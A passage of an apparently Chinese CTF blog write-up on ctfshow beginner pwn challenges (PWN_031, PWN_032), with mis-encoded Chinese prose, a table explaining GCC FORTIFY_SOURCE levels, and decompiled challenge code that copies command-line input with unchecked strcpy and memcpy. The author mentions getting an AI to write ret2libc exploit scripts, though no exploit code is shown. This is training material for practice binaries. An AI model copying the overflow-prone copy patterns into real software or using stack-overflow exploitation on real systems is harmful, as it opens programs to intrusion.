&lt;/div&gt;&lt;p&gt;è¿™é‡Œçš„åœ°å€æ˜¯å¯ä»¥æ‰‹å†™çš„ï¼Œä½†æˆ‘ä¸å»ºè®®ï¼ŒAIç»™çš„æ˜¯ç¡®åˆ‡åœ°å€ï¼Œè¿™é‡Œæˆ‘ç»™æ”¹äº†ï¼Œä¸‹æ¬¡AIå†™è„šæœ¬ï¼Œåœ°å€ä¸€å®šä¸è¦æ‰‹åŠ¨ç¡¬å†™å‡ºæ¥ï¼Œå¸®AIæ”¹ä¸€ä¸‹æ”¹æˆè‡ªåŠ¨è·å–çš„ï¼Œæ¯”å¦‚ä¸Šé¢è¿™æ ·ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è·å–åœ°å€çš„ï¼Œè¿™æ ·æ¯”è¾ƒå‡†ç¡®ä¸ä¼šå‡ºé”™å´©æºƒã€‚&lt;/p&gt;
&lt;p&gt;è¯´å®è¯ï¼Œç»™æˆ‘è‚¯å®šå†™ä¸åˆ°çš„ï¼Œä¸ç†Ÿæ‚‰ç¼–å†™pythonè¿œç¨‹äº¤äº’è„šæœ¬ï¼Œä½†æˆ‘å¯ä»¥è¯»æ‡‚ï¼Œæˆ‘å¯ä»¥ç”¨AIå¸®æˆ‘å†™ä»£ç ï¼Œæˆ‘å°±æŠŠæ„æ„¿å‘Šè¯‰å®ƒï¼ŒæŠŠIDAæ±‡ç¼–ä»£ç ä»¥åŠè·Ÿè¿›çš„å‡½æ•°å¤åˆ¶å‘ç»™å®ƒï¼Œé™„ä¸Šæˆ‘çš„æ€è·¯ï¼Œä¸å¦‚å·²ç»çŸ¥é“æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ç¼–å†™ret2libcã€çŸ¥é“å¼€å¯äº†å“ªäº›ä¿æŠ¤ã€ä¸€æ­¥æ­¥ä¿®æ”¹å¾—åˆ°çš„ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_031å¾…å®š&#34;&gt;PWN_031ï¼ˆå¾…å®šï¼‰
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå¼€å¯ ASLR å’Œ PIE çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨ï¼› &lt;a class=&#34;link&#34; href=&#34;PWN_031&#34; &gt;PWN_031&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼Œæ— æ ˆä¿æŠ¤ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/83.png&#34;
	width=&#34;1153&#34;
	height=&#34;201&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/83_hu_7ff647734d8a0296.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/83_hu_441617b6b4ffee67.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æ ˆæº¢å‡º&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;573&#34;
		data-flex-basis=&#34;1376px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/84.png&#34;
	width=&#34;674&#34;
	height=&#34;184&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/84_hu_b9ac56fd6a862ae6.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/84_hu_3105db06c121094.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;366&#34;
		data-flex-basis=&#34;879px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°åŒæ ·çš„ä»£ç ï¼Œæœ‰æº¢å‡ºï¼Œä¼¼ä¹å¯ç”¨ä¸Šé¢˜çš„expï¼Œä¸è¿‡checksecçœ‹åˆ°çš„ä¿æŠ¤æ˜¯ä¸ä¸€æ ·çš„ï¼Œexpè‚¯å®šä¸ä¸€æ ·äº†&amp;hellip;.&lt;/p&gt;
&lt;p&gt;è¿è¡Œä¹‹åè«åå…¶å¦™ï¼Œä¼šæœ‰æŠ¥éšæœºåŒ–çš„åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/85.png&#34;
	width=&#34;1055&#34;
	height=&#34;680&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/85_hu_164fbd871315e02a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/85_hu_4528b5c9989ab6ae.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;155&#34;
		data-flex-basis=&#34;372px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&amp;hellip;..&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Claire-cat/articles/19030339&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;æ·±å…¥åˆ†æCTFshow-PWNå…¥é—¨-pwn31çš„è§£æ³•ä¸åŸç† - Claire_cat - åšå®¢å›­&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é¢˜å’ŒPWN_025å·®ä¸å¤šï¼Œæœ‰å…³æ ˆæº¢å‡ºçš„çŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œå…ˆè·³&amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;fortifyç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥&#34;&gt;&lt;strong&gt;FORTIFYç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;FORTIFY_SOURCE&lt;/code&gt; æ˜¯ GCC æä¾›çš„ä¸€ç§è½»é‡çº§ç¼“å†²åŒºæº¢å‡ºä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡å¯¹å±é™©å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;strcpy&lt;/code&gt;ã€&lt;code&gt;memcpy&lt;/code&gt; ç­‰ï¼‰è¿›è¡Œå¢å¼ºæ£€æŸ¥ï¼Œé™ä½ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„åˆ©ç”¨é£é™©ã€‚å®ƒæœ‰ 3 ä¸ªçº§åˆ«ï¼š&lt;code&gt;_FORTIFY_SOURCE=0&lt;/code&gt;ï¼ˆå…³é—­ï¼‰ã€&lt;code&gt;_FORTIFY_SOURCE=1&lt;/code&gt;ï¼ˆåŸºç¡€ä¿æŠ¤ï¼‰ã€&lt;code&gt;_FORTIFY_SOURCE=2&lt;/code&gt;ï¼ˆå¼ºåŒ–ä¿æŠ¤ï¼‰ï¼Œå„çº§åˆ«åŒºåˆ«å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;çº§åˆ«&lt;/th&gt;
          &lt;th&gt;å¯ç”¨æ¡ä»¶&lt;/th&gt;
          &lt;th&gt;æ ¸å¿ƒæ£€æŸ¥é€»è¾‘&lt;/th&gt;
          &lt;th&gt;é˜²æŠ¤èŒƒå›´&lt;/th&gt;
          &lt;th&gt;æ€§èƒ½å½±å“&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;é»˜è®¤ï¼ˆæ— éœ€å®šä¹‰å®ï¼‰&lt;/td&gt;
          &lt;td&gt;æ— ä»»ä½•æ£€æŸ¥ï¼Œä½¿ç”¨åŸå§‹å‡½æ•°&lt;/td&gt;
          &lt;td&gt;æ— &lt;/td&gt;
          &lt;td&gt;æ— &lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;-D_FORTIFY_SOURCE=1 -O1&lt;/td&gt;
          &lt;td&gt;æ£€æŸ¥ â€œæºé•¿åº¦ &amp;lt; ç›®æ ‡ç¼“å†²åŒºé•¿åº¦â€ï¼ˆä»…é™ç¼–è¯‘æœŸå¯çŸ¥ï¼‰&lt;/td&gt;
          &lt;td&gt;éƒ¨åˆ†é™æ€åœºæ™¯&lt;/td&gt;
          &lt;td&gt;æå°&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;-D_FORTIFY_SOURCE=2 -O2&lt;/td&gt;
          &lt;td&gt;æ£€æŸ¥ â€œæ“ä½œé•¿åº¦ â‰¤ ç›®æ ‡ç¼“å†²åŒºå®é™…å¤§å°â€ï¼ˆå«è¿è¡Œæ—¶ï¼‰&lt;/td&gt;
          &lt;td&gt;é™æ€ + åŠ¨æ€åœºæ™¯ï¼Œè¦†ç›–æ›´å¤šå‡½æ•°&lt;/td&gt;
          &lt;td&gt;è½»å¾®&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;FORTIFY_SOURCE&lt;/code&gt; ä»…èƒ½é˜²æŠ¤éƒ¨åˆ†å·²çŸ¥çš„å±é™©å‡½æ•°ï¼Œæ— æ³•æ›¿ä»£ &lt;code&gt;NX&lt;/code&gt;ã€&lt;code&gt;Stack Canary&lt;/code&gt; ç­‰æ›´å…¨é¢çš„ä¿æŠ¤æœºåˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;å¿…é¡»é…åˆä¼˜åŒ–é€‰é¡¹ï¼ˆ&lt;code&gt;-O1&lt;/code&gt;/&lt;code&gt;-O2&lt;/code&gt;ï¼‰æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šå¿½ç•¥è¯¥å®å®šä¹‰ã€‚&lt;/li&gt;
&lt;li&gt;å¯¹äºåŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆå¦‚ &lt;code&gt;malloc&lt;/code&gt; åˆ†é…çš„ç¼“å†²åŒºï¼‰ï¼Œ&lt;code&gt;FORTIFY_SOURCE&lt;/code&gt; æ— æ³•è·å–å…¶å¤§å°ï¼Œå› æ­¤æ— æ³•é˜²æŠ¤ç›¸å…³æ“ä½œï¼ˆå¦‚ &lt;code&gt;memcpy(malloc_buf, src, n)&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;pwn_032&#34;&gt;PWN_032
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šFORTIFY_SOURCE=0ï¼š&lt;/p&gt;
&lt;p&gt;ç¦ç”¨ Fortify åŠŸèƒ½ã€‚ ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚ å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é¢˜ä¸»è¦æ˜¯åœ¨å‡½æ•°é€»è¾‘è¿è¡Œï¼ŒçŸ¥é“è¿è¡Œçš„åŸç†å°±å¥½ã€‚&lt;/p&gt;
&lt;p&gt;IDAåˆ†æmainï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/89.png&#34;
	width=&#34;849&#34;
	height=&#34;610&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/89_hu_46351ba23fdd4185.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/89_hu_90e899f007f35973.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;main&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;139&#34;
		data-flex-basis=&#34;334px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›undefinedå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/90.png&#34;
	width=&#34;1305&#34;
	height=&#34;355&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/90_hu_973dd70d1193f96a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/90_hu_8bf66355b5d6254e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;367&#34;
		data-flex-basis=&#34;882px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®åœ¨äºæˆåŠŸè¿›å…¥åˆ°undefinedå‡½æ•°æ‰æœ‰æœºä¼šä¸‹ä¸€æ­¥è·å¾—flagï¼š&lt;/p&gt;
&lt;p&gt;ä»mainå‡½æ•°å‡ºå‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;__fastcall&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;__gid_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// rax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// eax
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+4h] [rbp-44h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+Ah] [rbp-3Eh] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [rsp+15h] [rbp-33h] BYREF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;setresgid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;logo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_QWORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_QWORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//æŒ‡é’ˆ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_WORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_WORD&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//æŒ‡é’ˆ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;CTFshowPWN&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%s %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strtol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;memcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
